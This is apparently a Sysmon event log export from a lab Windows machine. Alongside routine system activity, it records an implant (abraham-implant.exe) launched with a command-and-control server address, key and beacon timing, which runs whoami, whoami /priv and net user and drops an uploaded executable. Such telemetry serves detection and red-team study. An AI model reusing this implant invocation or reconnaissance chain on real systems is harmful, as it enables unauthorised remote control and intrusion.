<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2026-09-10T23:12:15.6145373Z'/><EventRecordID>43</EventRecordID><Correlation/><Execution ProcessID='8800' ThreadID='7548'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>Abraham</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2026-09-10 23:12:15.579</Data><Data Name='ProcessGuid'>{c4fe85a1-394f-6aa3-2203-000000000a00}</Data><Data Name='ProcessId'>7528</Data><Data Name='Image'>C:\Windows\UUS\amd64\MoUsoCoreWorker.exe</Data><Data Name='FileVersion'>1509.2608.11022.0</Data><Data Name='Description'>MoUSO Core Worker Process</Data><Data Name='Product'>Microsoft® Windows® Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>MoUSOCoreWorker.exe</Data><Data Name='CommandLine'>"C:\WINDOWS\uus\AMD64\MoUsoCoreWorker.exe" useprivatenamespaces</Data><Data Name='CurrentDirectory'>C:\WINDOWS\system32\</Data><Data Name='User'>NT AUTHORITY\SYSTEM</Data><Data Name='LogonGuid'>{c4fe85a1-264c-6aa3-e703-000000000000}</Data><Data Name='LogonId'>0x3e7</Data><Data Name='TerminalSessionId'>0</Data><Data Name='IntegrityLevel'>System</Data><Data Name='Hashes'>MD5=CAC872010E2ABE5E5090E7E3A0EED549,SHA256=C3848A3136ACD302B13A0D930B2C7E7A44CCC31D5D5758FD55F06C178731383B,IMPHASH=6FD201EF140EA230B8153D94C2A4D885</Data><Data Name='ParentProcessGuid'>{c4fe85a1-26ca-6aa3-7900-000000000a00}</Data><Data Name='ParentProcessId'>772</Data><Data Name='ParentImage'>C:\Windows\System32\svchost.exe</Data><Data Name='ParentCommandLine'>C:\WINDOWS\system32\svchost.exe -k netsvcs -p -s UsoSvc</Data><Data Name='ParentUser'>NT AUTHORITY\SYSTEM</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2026-09-10T23:11:25.1544348Z'/><EventRecordID>42</EventRecordID><Correlation/><Execution ProcessID='8800' ThreadID='7548'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>Abraham</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2026-09-10 23:11:25.147</Data><Data Name='ProcessGuid'>{c4fe85a1-391d-6aa3-2103-000000000a00}</Data><Data Name='ProcessId'>6896</Data><Data Name='Image'>C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe</Data><Data Name='FileVersion'>1.3.265.7</Data><Data Name='Description'>Microsoft Edge Update</Data><Data Name='Product'>Microsoft Edge Update</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>MicrosoftEdgeUpdate.exe</Data><Data Name='CommandLine'>"C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe" /ua /installsource scheduler</Data><Data Name='CurrentDirectory'>C:\WINDOWS\system32\</Data><Data Name='User'>NT AUTHORITY\SYSTEM</Data><Data Name='LogonGuid'>{c4fe85a1-264c-6aa3-e703-000000000000}</Data><Data Name='LogonId'>0x3e7</Data><Data Name='TerminalSessionId'>0</Data><Data Name='IntegrityLevel'>System</Data><Data Name='Hashes'>MD5=6487689A20EFAF7B81E26DAD2AE14B66,SHA256=04F2BF85EA2B6B6464D92CF196B64174CBF2E4C9EE304DC7DE00C1DE5622FDA8,IMPHASH=CD3B2D99C6655A5D4A14E30E380F5BF9</Data><Data Name='ParentProcessGuid'>{c4fe85a1-264e-6aa3-1b00-000000000a00}</Data><Data Name='ParentProcessId'>1520</Data><Data Name='ParentImage'>C:\Windows\System32\svchost.exe</Data><Data Name='ParentCommandLine'>C:\WINDOWS\system32\svchost.exe -k netsvcs -p -s Schedule</Data><Data Name='ParentUser'>NT AUTHORITY\SYSTEM</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>11</EventID><Version>2</Version><Level>4</Level><Task>11</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2026-09-10T23:10:56.7151165Z'/><EventRecordID>41</EventRecordID><Correlation/><Execution ProcessID='8800' ThreadID='7548'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>Abraham</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>EXE</Data><Data Name='UtcTime'>2026-09-10 23:10:56.712</Data><Data Name='ProcessGuid'>{c4fe85a1-37e3-6aa3-0403-000000000a00}</Data><Data Name='ProcessId'>2232</Data><Data Name='Image'>C:\Users\antho\Desktop\abraham-implant.exe</Data><Data Name='TargetFilename'>C:\Users\lab\Desktop\abraham-uploaded.exe</Data><Data Name='CreationUtcTime'>2026-09-10 23:10:56.712</Data><Data Name='User'>Abraham\lab</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2026-09-10T23:10:56.6868443Z'/><EventRecordID>40</EventRecordID><Correlation/><Execution ProcessID='8800' ThreadID='7548'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>Abraham</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2026-09-10 23:10:56.682</Data><Data Name='ProcessGuid'>{c4fe85a1-3900-6aa3-1f03-000000000a00}</Data><Data Name='ProcessId'>10112</Data><Data Name='Image'>C:\Windows\System32\net1.exe</Data><Data Name='FileVersion'>10.0.26100.7019 (WinBuild.160101.0800)</Data><Data Name='Description'>Net Command</Data><Data Name='Product'>Microsoft® Windows® Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>net1.exe</Data><Data Name='CommandLine'>C:\WINDOWS\system32\net1  user</Data><Data Name='CurrentDirectory'>C:\Windows\System32\</Data><Data Name='User'>Abraham\lab</Data><Data Name='LogonGuid'>{c4fe85a1-37e3-6aa3-884c-570000000000}</Data><Data Name='LogonId'>0x574c88</Data><Data Name='TerminalSessionId'>0</Data><Data Name='IntegrityLevel'>High</Data><Data Name='Hashes'>MD5=158DB954503C803C0840DD424FB608F8,SHA256=8489DB35375D890314EB8F7CD9E0CBD3866475F4E252865F00F649B0A02FD757,IMPHASH=98A56655C7E54BCE7F55B3F01AB5B07E</Data><Data Name='ParentProcessGuid'>{c4fe85a1-3900-6aa3-1e03-000000000a00}</Data><Data Name='ParentProcessId'>5768</Data><Data Name='ParentImage'>C:\Windows\System32\net.exe</Data><Data Name='ParentCommandLine'>net  user</Data><Data Name='ParentUser'>Abraham\lab</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2026-09-10T23:10:56.6750224Z'/><EventRecordID>39</EventRecordID><Correlation/><Execution ProcessID='8800' ThreadID='7548'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>Abraham</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2026-09-10 23:10:56.670</Data><Data Name='ProcessGuid'>{c4fe85a1-3900-6aa3-1e03-000000000a00}</Data><Data Name='ProcessId'>5768</Data><Data Name='Image'>C:\Windows\System32\net.exe</Data><Data Name='FileVersion'>10.0.26100.7019 (WinBuild.160101.0800)</Data><Data Name='Description'>Net Command</Data><Data Name='Product'>Microsoft® Windows® Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>net.exe</Data><Data Name='CommandLine'>net  user</Data><Data Name='CurrentDirectory'>C:\Windows\System32\</Data><Data Name='User'>Abraham\lab</Data><Data Name='LogonGuid'>{c4fe85a1-37e3-6aa3-884c-570000000000}</Data><Data Name='LogonId'>0x574c88</Data><Data Name='TerminalSessionId'>0</Data><Data Name='IntegrityLevel'>High</Data><Data Name='Hashes'>MD5=8A1E71312BD2AAE202652113049CDBD1,SHA256=BB3E638C8B5B6EF80847E364AEEF2796CAD25D3539CF9B41D3820FA48943E777,IMPHASH=EF46B86C2346DA0A991DE4B78AAF4E75</Data><Data Name='ParentProcessGuid'>{c4fe85a1-3900-6aa3-1d03-000000000a00}</Data><Data Name='ParentProcessId'>9364</Data><Data Name='ParentImage'>C:\Windows\System32\cmd.exe</Data><Data Name='ParentCommandLine'>"cmd" /C "net user"</Data><Data Name='ParentUser'>Abraham\lab</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2026-09-10T23:10:56.6613400Z'/><EventRecordID>38</EventRecordID><Correlation/><Execution ProcessID='8800' ThreadID='7548'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>Abraham</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2026-09-10 23:10:56.654</Data><Data Name='ProcessGuid'>{c4fe85a1-3900-6aa3-1d03-000000000a00}</Data><Data Name='ProcessId'>9364</Data><Data Name='Image'>C:\Windows\System32\cmd.exe</Data><Data Name='FileVersion'>10.0.26100.9278 (WinBuild.160101.0800)</Data><Data Name='Description'>Windows Command Processor</Data><Data Name='Product'>Microsoft® Windows® Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>Cmd.Exe</Data><Data Name='CommandLine'>"cmd" /C "net user"</Data><Data Name='CurrentDirectory'>C:\WINDOWS\system32\</Data><Data Name='User'>Abraham\lab</Data><Data Name='LogonGuid'>{c4fe85a1-37e3-6aa3-884c-570000000000}</Data><Data Name='LogonId'>0x574c88</Data><Data Name='TerminalSessionId'>0</Data><Data Name='IntegrityLevel'>High</Data><Data Name='Hashes'>MD5=CE396564392FAFAAD5C07A5E2DADE4E6,SHA256=97AC98B1A92C286054CCE55239CFCCDFC23A5517BD07FE693072C9CA96C7DABB,IMPHASH=010B165E4C37F484601D3DBD700C9423</Data><Data Name='ParentProcessGuid'>{c4fe85a1-37e3-6aa3-0403-000000000a00}</Data><Data Name='ParentProcessId'>2232</Data><Data Name='ParentImage'>C:\Users\antho\Desktop\abraham-implant.exe</Data><Data Name='ParentCommandLine'>"C:\Users\antho\Desktop\abraham-implant.exe" "--server" "192.168.162.1:8443" "--key" "ae5ac1c402eb43b2ce38d61646e5e50dd3ee42ef894659734d4c1ee78d82086a" "--sleep" "3" "--jitter" "0.25" "-noWait" </Data><Data Name='ParentUser'>Abraham\lab</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2026-09-10T23:10:56.6165604Z'/><EventRecordID>37</EventRecordID><Correlation/><Execution ProcessID='8800' ThreadID='7548'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>Abraham</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2026-09-10 23:10:56.613</Data><Data Name='ProcessGuid'>{c4fe85a1-3900-6aa3-1c03-000000000a00}</Data><Data Name='ProcessId'>4200</Data><Data Name='Image'>C:\Windows\System32\whoami.exe</Data><Data Name='FileVersion'>10.0.26100.1882 (WinBuild.160101.0800)</Data><Data Name='Description'>whoami - displays logged on user information</Data><Data Name='Product'>Microsoft® Windows® Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>whoami.exe</Data><Data Name='CommandLine'>whoami  /priv</Data><Data Name='CurrentDirectory'>C:\Windows\System32\</Data><Data Name='User'>Abraham\lab</Data><Data Name='LogonGuid'>{c4fe85a1-37e3-6aa3-884c-570000000000}</Data><Data Name='LogonId'>0x574c88</Data><Data Name='TerminalSessionId'>0</Data><Data Name='IntegrityLevel'>High</Data><Data Name='Hashes'>MD5=956692DADC5B2CEB46E9219F7A5BEFFA,SHA256=23240EF9F8B0A9A324110B1C2331DE31DC1B0E08F5359CB707E51A939AF56CD3,IMPHASH=E4464BCD92DF7AC69CCD074CB9C0EFED</Data><Data Name='ParentProcessGuid'>{c4fe85a1-3900-6aa3-1b03-000000000a00}</Data><Data Name='ParentProcessId'>3068</Data><Data Name='ParentImage'>C:\Windows\System32\cmd.exe</Data><Data Name='ParentCommandLine'>"cmd" /C "whoami /priv"</Data><Data Name='ParentUser'>Abraham\lab</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2026-09-10T23:10:56.6045372Z'/><EventRecordID>36</EventRecordID><Correlation/><Execution ProcessID='8800' ThreadID='7548'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>Abraham</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2026-09-10 23:10:56.598</Data><Data Name='ProcessGuid'>{c4fe85a1-3900-6aa3-1b03-000000000a00}</Data><Data Name='ProcessId'>3068</Data><Data Name='Image'>C:\Windows\System32\cmd.exe</Data><Data Name='FileVersion'>10.0.26100.9278 (WinBuild.160101.0800)</Data><Data Name='Description'>Windows Command Processor</Data><Data Name='Product'>Microsoft® Windows® Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>Cmd.Exe</Data><Data Name='CommandLine'>"cmd" /C "whoami /priv"</Data><Data Name='CurrentDirectory'>C:\WINDOWS\system32\</Data><Data Name='User'>Abraham\lab</Data><Data Name='LogonGuid'>{c4fe85a1-37e3-6aa3-884c-570000000000}</Data><Data Name='LogonId'>0x574c88</Data><Data Name='TerminalSessionId'>0</Data><Data Name='IntegrityLevel'>High</Data><Data Name='Hashes'>MD5=CE396564392FAFAAD5C07A5E2DADE4E6,SHA256=97AC98B1A92C286054CCE55239CFCCDFC23A5517BD07FE693072C9CA96C7DABB,IMPHASH=010B165E4C37F484601D3DBD700C9423</Data><Data Name='ParentProcessGuid'>{c4fe85a1-37e3-6aa3-0403-000000000a00}</Data><Data Name='ParentProcessId'>2232</Data><Data Name='ParentImage'>C:\Users\antho\Desktop\abraham-implant.exe</Data><Data Name='ParentCommandLine'>"C:\Users\antho\Desktop\abraham-implant.exe" "--server" "192.168.162.1:8443" "--key" "ae5ac1c402eb43b2ce38d61646e5e50dd3ee42ef894659734d4c1ee78d82086a" "--sleep" "3" "--jitter" "0.25" "-noWait" </Data><Data Name='ParentUser'>Abraham\lab</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2026-09-10T23:10:56.5841051Z'/><EventRecordID>35</EventRecordID><Correlation/><Execution ProcessID='8800' ThreadID='7548'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>Abraham</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2026-09-10 23:10:56.579</Data><Data Name='ProcessGuid'>{c4fe85a1-3900-6aa3-1a03-000000000a00}</Data><Data Name='ProcessId'>4460</Data><Data Name='Image'>C:\Windows\System32\whoami.exe</Data><Data Name='FileVersion'>10.0.26100.1882 (WinBuild.160101.0800)</Data><Data Name='Description'>whoami - displays logged on user information</Data><Data Name='Product'>Microsoft® Windows® Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>whoami.exe</Data><Data Name='CommandLine'>whoami</Data><Data Name='CurrentDirectory'>C:\Windows\System32\</Data><Data Name='User'>Abraham\lab</Data><Data Name='LogonGuid'>{c4fe85a1-37e3-6aa3-884c-570000000000}</Data><Data Name='LogonId'>0x574c88</Data><Data Name='TerminalSessionId'>0</Data><Data Name='IntegrityLevel'>High</Data><Data Name='Hashes'>MD5=956692DADC5B2CEB46E9219F7A5BEFFA,SHA256=23240EF9F8B0A9A324110B1C2331DE31DC1B0E08F5359CB707E51A939AF56CD3,IMPHASH=E4464BCD92DF7AC69CCD074CB9C0EFED</Data><Data Name='ParentProcessGuid'>{c4fe85a1-3900-6aa3-1903-000000000a00}</Data><Data Name='ParentProcessId'>7832</Data><Data Name='ParentImage'>C:\Windows\System32\cmd.exe</Data><Data Name='ParentCommandLine'>"cmd" /C whoami</Data><Data Name='ParentUser'>Abraham\lab</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2026-09-10T23:10:56.5609261Z'/><EventRecordID>34</EventRecordID><Correlation/><Execution ProcessID='8800' ThreadID='7548'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>Abraham</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2026-09-10 23:10:56.548</Data><Data Name='ProcessGuid'>{c4fe85a1-3900-6aa3-1903-000000000a00}</Data><Data Name='ProcessId'>7832</Data><Data Name='Image'>C:\Windows\System32\cmd.exe</Data><Data Name='FileVersion'>10.0.26100.9278 (WinBuild.160101.0800)</Data><Data Name='Description'>Windows Command Processor</Data><Data Name='Product'>Microsoft® Windows® Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>Cmd.Exe</Data><Data Name='CommandLine'>"cmd" /C whoami</Data><Data Name='CurrentDirectory'>C:\WINDOWS\system32\</Data><Data Name='User'>Abraham\lab</Data><Data Name='LogonGuid'>{c4fe85a1-37e3-6aa3-884c-570000000000}</Data><Data Name='LogonId'>0x574c88</Data><Data Name='TerminalSessionId'>0</Data><Data Name='IntegrityLevel'>High</Data><Data Name='Hashes'>MD5=CE396564392FAFAAD5C07A5E2DADE4E6,SHA256=97AC98B1A92C286054CCE55239CFCCDFC23A5517BD07FE693072C9CA96C7DABB,IMPHASH=010B165E4C37F484601D3DBD700C9423</Data><Data Name='ParentProcessGuid'>{c4fe85a1-37e3-6aa3-0403-000000000a00}</Data><Data Name='ParentProcessId'>2232</Data><Data Name='ParentImage'>C:\Users\antho\Desktop\abraham-implant.exe</Data><Data Name='ParentCommandLine'>"C:\Users\antho\Desktop\abraham-implant.exe" "--server" "192.168.162.1:8443" "--key" "ae5ac1c402eb43b2ce38d61646e5e50dd3ee42ef894659734d4c1ee78d82086a" "--sleep" "3" "--jitter" "0.25" "-noWait" </Data><Data Name='ParentUser'>Abraham\lab</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2026-09-10T23:10:52.2494677Z'/><EventRecordID>33</EventRecordID><Correlation/><Execution ProcessID='8800' ThreadID='7548'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>Abraham</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2026-09-10 23:10:52.245</Data><Data Name='ProcessGuid'>{c4fe85a1-38fc-6aa3-1803-000000000a00}</Data><Data Name='ProcessId'>5592</Data><Data Name='Image'>C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe</Data><Data Name='FileVersion'>152.0.4191.66</Data><Data Name='Description'>Microsoft Edge</Data><Data Name='Product'>Microsoft Edge</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>msedge.exe</Data><Data Name='CommandLine'>"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --type=gpu-process --disable-gpu-sandbox --gpu-vendor-id=5140 --gpu-device-id=140 --gpu-sub-system-id=0 --gpu-revision=0 --gpu-driver-version=10.0.26100.9278 --gpu-preferences=WAAAAAAAAADoAAAEAAAAAAAAAAAAAGAAQAAAAAAAAAAAAAAAAAAAADgAAAAAAAAAAAAAAAAAAABCAAAAAAAAAAAAAAAAAAAAKAAAAAAAAAAoAAAAAAAAAAgAAAAAAAAADAAAAAEAAAAAAAAAAAAAAAgAAAAAAAAACAAAAAAAAAA= --use-gl=angle --use-angle=d3d11-warp-webgl --ssd-no-pressure-read-main-dll --metrics-shmem-handle=6308,i,4769882408677332142,6142958291917939571,262144 --field-trial-handle=2496,i,11309663674374989354,9957335283911033552,262144 --variations-seed-version --pseudonymization-salt-handle=2468,i,12788403181645571105,18140516375752026917,4 --trace-process-track-uuid=3190708996619331833 --mojo-platform-channel-handle=5540 /prefetch:10</Data><Data Name='CurrentDirectory'>C:\Program Files (x86)\Microsoft\Edge\Application\152.0.4191.66\</Data><Data Name='User'>Abraham\antho</Data><Data Name='LogonGuid'>{c4fe85a1-2a66-6aa3-5cf0-210000000000}</Data><Data Name='LogonId'>0x21f05c</Data><Data Name='TerminalSessionId'>1</Data><Data Name='IntegrityLevel'>Medium</Data><Data Name='Hashes'>MD5=37420AADF41F7DFE771A2B4BF5D4EDBA,SHA256=02AAED8823A4E4BAE8F672C620C9356BDDEBD68651D5BFD141ED9E6576D5F03C,IMPHASH=5CF043BE24821D48FE2001EA6C178A8F</Data><Data Name='ParentProcessGuid'>{c4fe85a1-3884-6aa3-0803-000000000a00}</Data><Data Name='ParentProcessId'>3020</Data><Data Name='ParentImage'>C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe</Data><Data Name='ParentCommandLine'>"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --flag-switches-begin --flag-switches-end --no-startup-window</Data><Data Name='ParentUser'>Abraham\antho</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2026-09-10T23:09:23.7054695Z'/><EventRecordID>32</EventRecordID><Correlation/><Execution ProcessID='8800' ThreadID='7548'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>Abraham</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2026-09-10 23:09:23.701</Data><Data Name='ProcessGuid'>{c4fe85a1-38a3-6aa3-1703-000000000a00}</Data><Data Name='ProcessId'>10652</Data><Data Name='Image'>C:\Windows\System32\taskhostw.exe</Data><Data Name='FileVersion'>10.0.26100.8328 (WinBuild.160101.0800)</Data><Data Name='Description'>Host Process for Windows Tasks</Data><Data Name='Product'>Microsoft® Windows® Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>taskhostw.exe</Data><Data Name='CommandLine'>taskhostw.exe</Data><Data Name='CurrentDirectory'>C:\WINDOWS\system32\</Data><Data Name='User'>NT AUTHORITY\SYSTEM</Data><Data Name='LogonGuid'>{c4fe85a1-264c-6aa3-e703-000000000000}</Data><Data Name='LogonId'>0x3e7</Data><Data Name='TerminalSessionId'>0</Data><Data Name='IntegrityLevel'>System</Data><Data Name='Hashes'>MD5=9E9370331B9D14ABBA21091FFFCD1D1E,SHA256=EA8D441DF237FB3D3B7A27A95FDE186E19C94D58A618F5C29ED5FC13CB155E96,IMPHASH=2196268E7A2880E3ADC74481297D0C4B</Data><Data Name='ParentProcessGuid'>{c4fe85a1-264e-6aa3-1b00-000000000a00}</Data><Data Name='ParentProcessId'>1520</Data><Data Name='ParentImage'>C:\Windows\System32\svchost.exe</Data><Data Name='ParentCommandLine'>C:\WINDOWS\system32\svchost.exe -k netsvcs -p -s Schedule</Data><Data Name='ParentUser'>NT AUTHORITY\SYSTEM</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2026-09-10T23:09:22.2570900Z'/><EventRecordID>31</EventRecordID><Correlation/><Execution ProcessID='8800' ThreadID='7548'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>Abraham</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2026-09-10 23:09:22.253</Data><Data Name='ProcessGuid'>{c4fe85a1-38a2-6aa3-1603-000000000a00}</Data><Data Name='ProcessId'>7384</Data><Data Name='Image'>C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe</Data><Data Name='FileVersion'>152.0.4191.66</Data><Data Name='Description'>Microsoft Edge</Data><Data Name='Product'>Microsoft Edge</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>msedge.exe</Data><Data Name='CommandLine'>"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --type=utility --utility-sub-type=chrome.mojom.UtilWin --lang=en-GB --service-sandbox-type=none --message-loop-type-ui --skip-read-main-dll --metrics-shmem-handle=7280,i,5228994371151551193,17416136122534841499,524288 --field-trial-handle=2496,i,11309663674374989354,9957335283911033552,262144 --variations-seed-version --pseudonymization-salt-handle=2468,i,12788403181645571105,18140516375752026917,4 --trace-process-track-uuid=3190708995682289984 --mojo-platform-channel-handle=7192 /prefetch:14</Data><Data Name='CurrentDirectory'>C:\Program Files (x86)\Microsoft\Edge\Application\152.0.4191.66\</Data><Data Name='User'>Abraham\antho</Data><Data Name='LogonGuid'>{c4fe85a1-2a66-6aa3-5cf0-210000000000}</Data><Data Name='LogonId'>0x21f05c</Data><Data Name='TerminalSessionId'>1</Data><Data Name='IntegrityLevel'>Medium</Data><Data Name='Hashes'>MD5=37420AADF41F7DFE771A2B4BF5D4EDBA,SHA256=02AAED8823A4E4BAE8F672C620C9356BDDEBD68651D5BFD141ED9E6576D5F03C,IMPHASH=5CF043BE24821D48FE2001EA6C178A8F</Data><Data Name='ParentProcessGuid'>{c4fe85a1-3884-6aa3-0803-000000000a00}</Data><Data Name='ParentProcessId'>3020</Data><Data Name='ParentImage'>C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe</Data><Data Name='ParentCommandLine'>"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --flag-switches-begin --flag-switches-end --no-startup-window</Data><Data Name='ParentUser'>Abraham\antho</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>22</EventID><Version>5</Version><Level>4</Level><Task>22</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2026-09-10T23:08:55.5213551Z'/><EventRecordID>30</EventRecordID><Correlation/><Execution ProcessID='8800' ThreadID='5644'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>Abraham</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2026-09-10 23:08:53.778</Data><Data Name='ProcessGuid'>{c4fe85a1-3884-6aa3-0b03-000000000a00}</Data><Data Name='ProcessId'>6584</Data><Data Name='QueryName'>wpad</Data><Data Name='QueryStatus'>9003</Data><Data Name='QueryResults'>-</Data><Data Name='Image'>C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe</Data><Data Name='User'>Abraham\antho</Data></EventData></Event>
